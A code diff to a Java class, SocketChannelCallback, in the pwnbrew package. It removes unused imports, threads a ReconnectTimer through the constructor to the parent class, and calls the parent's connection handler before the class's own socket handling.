@@ -37,11 +37,10 @@ The copyright on this package is held by Securifera, Inc
 */
 package pwnbrew.selector;
 
-import pwnbrew.ClientConfig;
 import pwnbrew.manager.ConnectionManager;
-import pwnbrew.manager.DataManager;
 import pwnbrew.network.ConnectionCallback;
 import pwnbrew.network.RegisterMessage;
+import pwnbrew.utilities.ReconnectTimer;
 
 /**
  *
@@ -59,9 +58,10 @@ public class SocketChannelCallback extends ConnectionCallback{
      * @param passedPort 
      * @param aMsg 
      * @param passedCM 
+     * @param passedTimer 
      */
-    public SocketChannelCallback(String passedIp, int passedPort, RegisterMessage aMsg, ConnectionManager passedCM) {
-        super(passedIp, passedPort);
+    public SocketChannelCallback(String passedIp, int passedPort, RegisterMessage aMsg, ConnectionManager passedCM, ReconnectTimer passedTimer) {
+        super(passedIp, passedPort, passedTimer);
         theRegMsg = aMsg;
         theCM = passedCM;
     }
@@ -73,6 +73,9 @@ public class SocketChannelCallback extends ConnectionCallback{
      */
     @Override
     public void handleConnection( int theChannelId ) {
+        
+        //Call the parent class function first
+        super.handleConnection(theChannelId);
         
         SocketChannelHandler srvHandler = theCM.getSocketChannelHandler( theChannelId );
         if( srvHandler != null ){
